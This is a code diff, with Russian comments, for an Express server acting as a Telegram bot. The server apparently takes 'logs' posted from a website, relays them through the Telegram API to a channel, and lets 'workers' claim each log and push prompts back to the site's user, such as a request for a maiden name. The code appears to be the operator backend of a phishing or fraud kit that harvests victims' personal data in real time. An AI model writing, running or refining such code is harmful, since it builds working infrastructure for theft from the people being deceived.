@@ -23,7 +23,7 @@ const cmdTexts = {
 
 const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 
-// --- ПУБЛИЧНЫЙ ЭНДПОИНТ ДЛЯ ПРОВЕРКИ (ЧТОБЫ НЕ СПАЛ) ---
+// --- ПУБЛИЧНЫЙ ЭНДПОИНТ (ЧТОБЫ НЕ СПАЛ) ---
 app.get('/health', (req, res) => res.send('Бот активен'));
 
 // --- ПРИЕМ ЛОГА С САЙТА ---
@@ -41,7 +41,7 @@ app.post('/api/log', async (req, res) => {
             chat_id: workerId,
             text: replyMsg,
             parse_mode: 'HTML'
-        }).catch(e => console.log("Error sending to worker"));
+        }).catch(e => console.log("Ошибка отправки воркеру"));
     } else {
         let channelMsg = `<b>🆕 НОВЫЙ ЛОГ [${safeText(type)}]</b>\n`;
         channelMsg += `🆔 ID: <code>${safeText(userId)}</code>\n`;
@@ -54,7 +54,7 @@ app.post('/api/log', async (req, res) => {
             reply_markup: { 
                 inline_keyboard: [[{ text: "⚡️ ВЗЯТЬ В РАБОТУ", callback_data: `take_${userId}` }]] 
             }
-        }).catch(e => console.log("Error sending to channel"));
+        }).catch(e => console.log("Ошибка отправки в канал"));
     }
     res.json({ success: true });
 });
@@ -68,6 +68,9 @@ app.get('/api/check/:userId', (req, res) => {
 
 // --- ВЕБХУК ТЕЛЕГРАМ ---
 app.post('/tg-webhook', async (req, res) => {
+    // Отвечаем Телеграму сразу (200 OK), чтобы он не переспрашивал и кнопки не висели
+    res.sendStatus(200);
+
     try {
         const { message, callback_query } = req.body;
 
@@ -78,7 +81,7 @@ app.post('/tg-webhook', async (req, res) => {
             if (message.text === '/start') {
                 return await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     chat_id: chatId,
-                    text: "<b>👋 Бот запущен и готов к работе!</b>",
+                    text: "<b>👋 Бот запущен!</b>",
                     parse_mode: 'HTML'
                 });
             } 
@@ -89,26 +92,26 @@ app.post('/tg-webhook', async (req, res) => {
                 
                 await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     chat_id: chatId,
-                    text: `✅ Сообщение отправлено пользователю <code>${targetUserId}</code>.\n<b>Ожидаем ответ...</b>`,
+                    text: `✅ Сообщение отправлено пользователю <code>${targetUserId}</code>.`,
                     parse_mode: 'HTML'
                 });
             }
-            return res.sendStatus(200);
+            return;
         }
 
         // 2. ОБРАБОТКА КНОПОК
         if (callback_query) {
-            const data = callback_query.data;
             const workerId = callback_query.from.id;
-            const parts = data.split('_');
-            const action = parts[0];
-            const userId = parts[1];
-            const code = parts[2];
+            const [action, userId, code] = callback_query.data.split('_');
+
+            // Убираем анимацию загрузки на кнопке немедленно
+            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                callback_query_id: callback_query.id
+            }).catch(() => {});
 
             if (action === 'take') {
                 const log = logsStorage[userId];
                 if (log) {
-                    // ЗАКРЕПЛЯЕМ СВЯЗЬ СРАЗУ
                     waitingForText[workerId] = userId; 
 
                     let fullMsg = `<b>💎 УПРАВЛЕНИЕ ЛОГОМ [${log.type}]</b>\n`;
@@ -132,34 +135,30 @@ app.post('/tg-webhook', async (req, res) => {
                     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                         chat_id: CHANNEL_ID,
                         message_id: callback_query.message.message_id,
-                        text: `<b>🆕 ЛОГ [${log.type}]</b>\n🆔 ID: <code>${userId}</code>\n📍 Взял в работу: <b>${workerName}</b> ✅`,
+                        text: `<b>🆕 ЛОГ [${log.type}]</b>\n🆔 ID: <code>${userId}</code>\n📍 Взял: <b>${workerName}</b> ✅`,
                         parse_mode: 'HTML'
                     });
                 }
             }
 
             if (action === 'custom') {
-                waitingForText[workerId] = userId; // Еще раз закрепляем для надежности
+                waitingForText[workerId] = userId;
                 await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     chat_id: workerId,
-                    text: `⌨️ <b>Введите текст для пользователя <code>${userId}</code>:</b>\nНапример: <i>"Введите девичью фамилию"</i>`,
+                    text: `⌨️ <b>Введите текст для юзера <code>${userId}</code>:</b>`,
                     parse_mode: 'HTML'
                 });
             }
 
             if (action === 'ask' || action === 'msg') {
-                // При нажатии кнопок команд тоже закрепляем связь, если она вдруг слетела
                 waitingForText[workerId] = userId;
                 userTasks[userId] = { action, text: cmdTexts[code] || "Введите данные" };
-                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-                    callback_query_id: callback_query.id,
-                    text: "✅ Команда отправлена!"
-                });
             }
         }
-    } catch (e) { console.error("Webhook Error:", e.message); }
-    res.sendStatus(200);
+    } catch (e) {
+        console.error("Webhook Error:", e.message);
+    }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`🚀 Сервер запущен на порту ${PORT}`));
+app.listen(PORT, () => console.log(`🚀 Сервер на порту ${PORT}`));
